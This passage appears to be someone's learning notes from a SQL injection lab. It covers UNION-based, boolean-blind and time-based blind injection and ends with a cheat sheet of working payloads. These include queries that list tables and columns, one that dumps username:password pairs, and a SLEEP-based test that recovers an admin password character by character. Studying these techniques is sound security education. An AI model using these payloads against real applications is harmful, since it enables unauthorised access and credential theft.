LIKE '49%'
```

then:

``` sql
LIKE '496%'
```

then:

``` sql
LIKE '4961%'
```

Each successful delay confirms another character.

------------------------------------------------------------------------

# What I Actually Learned

## 1. UNION-Based SQLi

Used when the application's response displays database results.

Basic idea:

``` sql
UNION SELECT ...
```

Main challenge:

``` text
Find the correct number of columns.
```

------------------------------------------------------------------------

## 2. Blind SQLi

The application does not directly reveal useful data.

Instead, we use a condition such as:

``` sql
OR 1=1
```

to change the application's behaviour.

------------------------------------------------------------------------

## 3. Boolean-Based Blind SQLi

Ask database questions:

``` sql
database() LIKE 's%'
```

and observe:

``` text
TRUE / FALSE
```

Then recover information character-by-character.

------------------------------------------------------------------------

## 4. Time-Based Blind SQLi

When there is no useful visible TRUE/FALSE difference, deliberately
create a delay:

``` sql
IF(condition,SLEEP(5),0)
```

Then:

``` text
5 seconds → TRUE
0 seconds → FALSE
```

This turns **time itself into a data channel**.

------------------------------------------------------------------------

# Quick Cheat Sheet

### Find UNION column count

``` sql
' UNION SELECT 1,2,3;--
```

### Show which columns are reflected

``` sql
' UNION SELECT 'A','B','C';--
```

### List tables

``` sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='DATABASE'
```

### List columns

``` sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='TABLE'
```

### Dump username + password

``` sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM users
```

### Boolean test

``` sql
' UNION SELECT 1,2,3 WHERE <condition>;--
```

### Time-based test

``` sql
' UNION SELECT IF(<condition>,SLEEP(5),0),2;--
```

### Password prefix test

``` sql
' UNION SELECT IF(
(SELECT password FROM users WHERE username='admin')
LIKE '4%',
SLEEP(3),0
),2;--
```

------------------------------------------------------------------------




